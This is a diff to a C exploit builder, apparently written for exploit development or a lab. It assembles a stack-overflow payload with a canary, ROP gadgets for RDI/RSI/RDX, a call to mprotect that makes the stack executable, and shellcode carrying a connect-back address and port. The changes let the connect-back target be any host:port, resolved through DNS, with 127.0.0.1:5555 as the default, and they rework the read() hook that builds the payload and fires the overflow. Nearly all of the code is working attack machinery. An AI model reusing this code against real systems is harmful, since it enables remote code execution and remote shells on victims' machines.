@@ -115,9 +115,7 @@ typedef union AddressUnion {
 	char	c[8];
 } AddressUnion, *AddressUnionPtr;
 
-typedef struct IPAdress {
-	unsigned char a, b, c, d;
-} IPAddress, *IPAddressPtr;
+typedef struct in_addr IPAddress, *IPAddressPtr;
 
 typedef struct ShellCode {
 	unsigned char	prolog[18];
@@ -151,7 +149,6 @@ static const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};
 static const char *s_magic = "xyzzy";
 
 static const char *s_makeload = "MAKELOAD";
-static const char *s_fillload = "FILLLOAD";
 static const char *s_dumpload = "DUMPLOAD";
 static const char *s_testload = "TESTLOAD";
 static const char *s_overflow = "OVERFLOW";
@@ -331,12 +328,9 @@ static void makeload(PayloadPtr plp) {
 
 	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B');
 
-	plp->pl_scu.sc.port       = htons(5555);
-	plp->pl_scu.sc.ipAddress = (IPAddress) {127, 0, 0, 1};
-	//plp->pl_scu.sc.address[0] = 127;
-	//plp->pl_scu.sc.address[1] = 0;
-	//plp->pl_scu.sc.address[2] = 0;
-	//plp->pl_scu.sc.address[3] = 1;
+	plp->pl_scu.sc.port     = htons(5555);
+	if (!inet_aton("127.0.0.1", &plp->pl_scu.sc.ipAddress))
+		assert(0); // This should ALWAYS work.
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
@@ -369,21 +363,18 @@ static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
 
 	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",			"pl_canary.p",		plp->pl_canary.p);
-	printf("%20s: %p\n",			"pl_rbp.p",		plp->pl_rbp.p);
-	printf("%20s: %p\n",			"pl_popRDI.p",		plp->pl_popRDI.p);
-	printf("%20s: %p\n",			"pl_stackPage.p",	plp->pl_stackPage.p);
-	printf("%20s: %p\n",			"pl_popRSI.p",		plp->pl_popRSI.p);
-	printf("%20s: %#tx\n",			"pl_stackSize",		plp->pl_stackSize);
-	printf("%20s: %p\n",			"pl_popRDX.p",		plp->pl_popRDX.p);
-	printf("%20s: %#tx\n",			"pl_permission",	plp->pl_permission);
-	printf("%20s: %p\n",			"pl_mprotect.p",	plp->pl_mprotect.p);
-	printf("%20s: %p\n",			"pl_shellCode.p",	plp->pl_shellCode.p);
-	printf("%20s: %d\n",			"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
-	printf("%20s: %hhu.%hhu.%hhu.%hhu\n",	"pl_scu.sc.ipAddress",	plp->pl_scu.sc.ipAddress.a,
-									plp->pl_scu.sc.ipAddress.b,
-									plp->pl_scu.sc.ipAddress.c,
-									plp->pl_scu.sc.ipAddress.d);
+	printf("%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
+	printf("%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
+	printf("%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
+	printf("%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
+	printf("%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
+	printf("%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
+	printf("%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
+	printf("%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
+	printf("%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
+	printf("%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
+	printf("%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
+	printf("%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
 	printf("--------------------------------------------\n");
 } // dumpload()
 
@@ -397,16 +388,6 @@ static void doFixups(PayloadPtr plp) {
 	plp->pl_mprotect  = fixupAddressUnion(plp->pl_mprotect);
         plp->pl_shellCode = fixupAddressUnion(plp->pl_shellCode); // Be sure that buffer_base is set by now.
 } // doFixups()
-
-static void fillload(PayloadPtr plp, size_t n) {
-	char dst[8] = {0};
-
-	printf("In fillload(), &dst: %p\n", dst);
-
-	// Fixups
-	//buffer_base = &dst;
-	//doFixups(plp);
-} // fillload()
 
 static void overflow(Pointer src, size_t n) {
 	char dst[8] = {0};
@@ -434,31 +415,30 @@ ssize_t read(int fd, void *buf, size_t count) {
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
 			makeload(&payload);
-dumpload(&payload);
-			// Take the IP address from after the word "MAKELOAD" (if it's there)
-			int nc;
-			IPAddress ip;
+
+			// Parse the stuff after MAKELOAD into s_host:port
+			int nc, ns;
+			char s_host[256];
 			unsigned short port;
-			int ns = sscanf(p, "%hhu.%hhu.%hhu.%hhu%n:%hu%n", &ip.a, &ip.b, &ip.c, &ip.d, &nc, &port, &nc);
-printf("RES: ns: %d, nc: %d\n", ns, nc);
-			if (ns >= 4) {
-				assert(ns <= 5);
-				payload.pl_scu.sc.ipAddress = ip;
-				if (ns > 4)
-					payload.pl_scu.sc.port = htons(port);
-			} else {
-/*
-				ns = sscanf(p, "%[^:]%n:%hun%n", hostName, &nc, &port, &nc);
-				if (ns >= 1) {
-					assert(ns <= 2);
-					payload asdf asdf asdf sdf 
-					if (ns > 1)
-						payload.pl_scu.sc.port = htons(port);
-				}
-*/
-				printf("Bad IP. Using 127.0.0.1\n");
-				nc = 0;
-			} // else
+
+			ns = sscanf(p, "%n%255[^: ]%n:%hu%n", &nc, s_host, &nc, &port, &nc);
+	 		assert(ns >= 0 && ns <= 2);
+			
+			// Set the port to whatever we got from the sscanf (store it in host endian order)
+			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);
+
+			// First we'll see if the s_host string can be parsed by inet_aton()
+			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0) {
+				struct hostent *he;
+
+				// Next we'll see if s_host can be resolved by DNS
+				if ((he = gethostbyname(s_host))) {
+					struct in_addr **addressList = (struct in_addr **) he->h_addr_list;
+
+					for (int i = 0; addressList[i] != NULL; i++)
+ 						payload.pl_scu.sc.ipAddress = *addressList[i];
+				} // if
+			} // if
 
 dumpload(&payload);
 			size_t payload64Size;
@@ -474,18 +454,13 @@ dumpload(&payload);
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
-		else if (!strncmp(s_fillload, p, strlen(s_fillload)))
-			fillload(&payload, sizeof(payload));
 		else if (!strncmp(s_testload, p, strlen(s_testload))) {
 			dumpload(&payload);
-			fillload(&payload, sizeof(payload));
 			dumpload(&payload);
 			overflow((Pointer)&payload, sizeof(payload));
 		}
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
 			base64Decode(p, p + strlen(s_overflow));
-dumpload((PayloadPtr) p);
-			fillload(((PayloadPtr) p), sizeof(Payload));
 			overflow(p, sizeof(Payload));
 
 		} // else if
@@ -514,7 +489,6 @@ return -1;
         initialize();
         makeload(&payload);
         dumpload(&payload);
-        fillload(&payload, sizeof(payload));
         dumpload(&payload);
         overflow((char *) &payload, sizeof(payload));
 } // main()
